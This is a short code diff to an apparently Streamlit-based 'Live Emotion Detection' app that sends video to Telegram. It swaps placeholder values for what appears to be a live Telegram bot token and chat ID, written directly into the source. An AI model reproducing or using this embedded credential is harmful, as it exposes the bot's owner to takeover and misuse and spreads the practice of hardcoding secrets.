@@ -10,8 +10,8 @@ st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout
 
 st.title("🎭 Live Emotion Detection")
 
-BOT_TOKEN = "YOUR_BOT_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
+BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
+CHAT_ID = "5317875689"
 
 
 def send_video_to_telegram(video_path):
